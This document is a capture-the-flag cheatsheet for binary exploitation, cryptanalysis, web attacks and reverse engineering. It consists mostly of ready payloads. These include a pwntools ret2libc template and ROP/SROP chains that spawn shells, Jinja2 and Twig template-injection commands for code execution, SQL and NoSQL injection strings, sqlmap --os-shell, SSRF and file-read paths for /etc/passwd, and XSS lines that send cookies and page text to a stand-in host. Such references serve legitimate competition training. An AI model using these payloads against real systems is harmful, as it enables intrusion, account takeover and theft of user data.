# CTF Cheatsheet

## General

```bash
python -m venv .venv
source .venv/bin/activate
pip install pwntools pycryptodome gmpy2 z3-solver angr requests flask
```

```bash
file ./chall
checksec --file ./chall
strings -a -t x ./chall | less
readelf -a ./chall | less
objdump -d -M intel ./chall | less
strace -f ./chall
ltrace -f ./chall
```

## Pwn

### Pwntools Template

```python
#!/usr/bin/env python3
import os
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "info"

HOST = "host"
PORT = 31337
LIBC_PATH = "./libc.so.6"
libc = ELF(LIBC_PATH, checksec=False) if os.path.exists(LIBC_PATH) else None

gdbscript = """
set pagination off
b *main
continue
"""

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gdbscript)
    return process([elf.path])

io = start()

sla = lambda delim, data: io.sendlineafter(delim, data)
sa = lambda delim, data: io.sendafter(delim, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()

offset = cyclic_find(0x6161616b)  # replace with crash value
rop = ROP(elf)

# Example leak -> ret2libc.
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
payload = flat(b"A" * offset, pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"])
sl(payload)
leak = u64(rl().strip().ljust(8, b"\x00"))
log.info("puts leak = %#x", leak)

if libc:
    libc.address = leak - libc.sym["puts"]
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    payload = flat(b"A" * offset, ret, pop_rdi, bin_sh, libc.sym["system"])
    sl(payload)

io.interactive()
```

### ROP Gadgets

```bash
ROPgadget --binary ./chall
ROPgadget --binary ./chall --only "pop|ret"
ROPgadget --binary ./chall --only "syscall"
ROPgadget --binary ./chall --opcode ffe4     # jmp rsp
ROPgadget --binary ./chall --opcode ffd4     # call rsp
ropper -f ./chall --search "pop rdi; ret"
ropper -f ./chall --search "syscall; ret"
```

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]

payload = flat(
    b"A" * offset,
    pop_rdi, next(elf.search(b"/bin/sh\x00")),
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,
)
```

### ret2csu

```text
gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget2: mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
constraint: rbx = 0, rbp = 1, r12 = callable function pointer table
```

### SROP

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
payload = flat(b"A" * offset, syscall_ret, bytes(frame))
```

### Format String

```python
def exec_fmt(payload):
    io = process(elf.path)
    io.sendline(payload)
    data = io.recvall(timeout=1)
    io.close()
    return data

fmt = FmtStr(exec_fmt)
offset = fmt.offset
payload = fmtstr_payload(offset, {elf.got["puts"]: elf.sym["win"]})
```

```text
%p.%p.%p.%p
%7$sAAAA + p64(addr)
%123c%8$hhn
%4660c%8$hn
```

### one_gadget

```bash
one_gadget ./libc.so.6
one_gadget --near puts ./libc.so.6
```

```python
og = libc.address + 0x4f322
payload = flat(b"A" * offset, og)
# Always check constraints: rsp alignment, environ, rax/rdx/rsi NULL, writable stack.
```

### Heap Quick Checks

```gdb
heap
bins
tcachebins
vis_heap_chunks
x/20gx 0xheapaddr
```

```python
# Safe-linking: stored_fd = target ^ (chunk_addr >> 12)
stored_fd = target ^ (chunk_addr >> 12)
```

## Crypto

### SageMath Basics

```python
# sage -python solve.py or sage solve.sage
from sage.all import *

n = 114514
R = Zmod(n)
a = R(123)
inv = inverse_mod(123, n)

p = 2**255 - 19
F = GF(p)
x = F(123)

crt = CRT_list([2, 3, 2], [3, 5, 7])
fac = factor(n)
```

```python
R.<x> = PolynomialRing(Zmod(n))
f = (m_known + x)^3 - c
roots = f.small_roots(X=2^64, beta=0.4)
```

```python
M = Matrix(ZZ, [[1, 2, 3], [4, 5, 6], [7, 8, 10]])
L = M.LLL()
ker = M.right_kernel()
sol = M.solve_right(vector(ZZ, [1, 2, 3]))
```

```python
E = EllipticCurve(GF(p), [a, b])
P = E(x1, y1)
Q = E(x2, y2)
R = P + Q
k = discrete_log(Q, P, operation="+")
```

### Common Attacks

```text
RSA low e broadcast: same m, e small, no padding -> CRT then integer nth root.
RSA common modulus: same n, gcd(e1,e2)=1 -> Bezout combine c1,c2.
RSA Wiener's: small d, d < n^0.25 -> continued fractions.
RSA Fermat: close p,q -> a=ceil(sqrt(n)), b^2=a^2-n.
RSA partial p/q bits: Coppersmith small roots.
RSA oracle: parity/LSB, PKCS#1 v1.5 Bleichenbacher, padding oracle.
ECDSA nonce reuse: k reused -> recover k then private key.
LCG: x_{i+1}=a*x_i+c mod m, recover a,c from consecutive states.
Many-time pad: same XOR keystream -> c1 xor c2 = p1 xor p2.
CBC bit flipping: flip previous block to control next plaintext block.
CBC padding oracle: byte-wise decrypt with valid/invalid padding.
Hash length extension: MD5/SHA1/SHA256(secret || msg), use hashpump/hash_extender.
Lattice: approximate relations, hidden number problem, knapsack, partial nonce.
```

### RSA Snippets

```python
from Crypto.Util.number import *

p = getPrime(512)
q = getPrime(512)
n = p * q
e = 65537
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = bytes_to_long(b"flag")
c = pow(m, e, n)
pt = long_to_bytes(pow(c, d, n))
```

```python
# Common modulus.
g, s, t = xgcd(e1, e2)
assert g == 1
m = (pow(c1, s, n) * pow(c2, t, n)) % n
```

```python
# Broadcast low e.
C = CRT_list([c1, c2, c3], [n1, n2, n3])
m = Integer(C).nth_root(3)
```

### Z3 Bit Vectors

```python
from z3 import *

x = [BitVec(f"x{i}", 8) for i in range(32)]
s = Solver()
for b in x:
    s.add(b >= 0x20, b <= 0x7e)
s.add(x[0] == ord("S"))
s.add((x[1] ^ x[2]) == 0x42)
assert s.check() == sat
m = s.model()
print(bytes([m[b].as_long() for b in x]))
```

## Web

### SSTI

```text
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
```

```text
# Jinja2 read globals / RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Jinja2 class traversal helper
{{ ''.__class__.__mro__[-1].__subclasses__() }}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<a href="javascript:alert(1)">x</a>
```

```html
<script>fetch('https://collab.example/?c='+encodeURIComponent(document.cookie))</script>
<img src=x onerror="fetch('https://collab.example/?d='+btoa(document.body.innerText))">
```

```javascript
// DOM sources
location.href
location.search
location.hash
document.referrer
window.name
localStorage

// DOM sinks
eval()
Function()
setTimeout()
innerHTML
outerHTML
insertAdjacentHTML()
postMessage()
```

### SQLi

```sql
' or '1'='1
' or 1=1--
admin' --
admin' #
') or ('1'='1
' union select null,null--
' union select table_name,column_name from information_schema.columns--
```

```sql
-- Error/time/boolean probes
' and extractvalue(1,concat(0x7e,database()))--
' and sleep(5)--
' and if(substr(database(),1,1)='a',sleep(5),0)--
' and ascii(substr((select database()),1,1))>100--
```

```bash
sqlmap -u "http://target/item?id=1" --dbs
sqlmap -u "http://target/login" --data "u=admin&p=test" --dbs
sqlmap -r request.txt --batch --risk 3 --level 5
sqlmap -u "http://target/item?id=1" --os-shell
```

### NoSQL / JWT / SSRF

```json
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":"admin","password":{"$regex":".*"}}
```

```bash
# JWT none / HS-RS confusion checks
jwt_tool token.jwt -X a
jwt_tool token.jwt -I -pc alg -pv none
```

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://2130706433/
http://0177.0.0.1/
http://127.1/
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
```

### Traversal / LFI

```text
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
data://text/plain,<?php system('id');?>
```

## Reverse

### radare2 / r2

```bash
r2 -A ./chall
r2 -d ./chall
r2 -w -A ./chall                 # writable mode for patching
```

```text
aaa                         analyze all
afl                         list functions
s main                      seek to symbol
pdf                         print disassembly function
pdc                         pseudo decompile
VV                          visual graph
agf                         ascii graph function
iz                          strings
iI                          binary info
iS                          sections
ii                          imports
is                          symbols
axt sym.imp.printf          xrefs to symbol/address
/x 41414141                 search hex
/c pop rdi                  search asm gadget
px 64 @ rsp                 hexdump
ps @ rdi                    print string
db *0x401234                breakpoint
dc                          continue
ds                          step
dso                         step over
dr                          registers
ood arg1 arg2               reopen debug with args
wa nop @ 0x401234           patch assembly
wx 9090 @ 0x401234          patch bytes
q                           quit; patches are written immediately in -w mode
```

### angr Template

```python
#!/usr/bin/env python3
import angr
import claripy

BIN = "./chall"
FIND = 0x401234
AVOID = [0x401111, 0x401222]
N = 32

proj = angr.Project(BIN, auto_load_libs=False)
flag = claripy.BVS("flag", 8 * N)
state = proj.factory.full_init_state(args=[BIN], stdin=flag)

for b in flag.chop(8):
    state.solver.add(b >= 0x20)
    state.solver.add(b <= 0x7e)
state.solver.add(flag.chop(8)[-1] == 0x0a)

simgr = proj.factory.simulation_manager(state)
simgr.explore(find=FIND, avoid=AVOID)

if simgr.found:
    s = simgr.found[0]
    print(s.solver.eval(flag, cast_to=bytes))
```

### Patch / Extract / Emulate

```bash
strings -a -t x ./chall
objdump -d -M intel ./chall | less
readelf -S ./chall
readelf -s ./chall
rabin2 -I ./chall
rabin2 -zz ./chall
upx -d packed -o unpacked
pyinstxtractor.py app.pyc
```

```python
# Python brute force skeleton.
import itertools

alphabet = b"abcdefghijklmnopqrstuvwxyz0123456789_{}"
for cand in itertools.product(alphabet, repeat=4):
    data = b"".join(bytes([c]) for c in cand)
    if check(data):
        print(data)
```
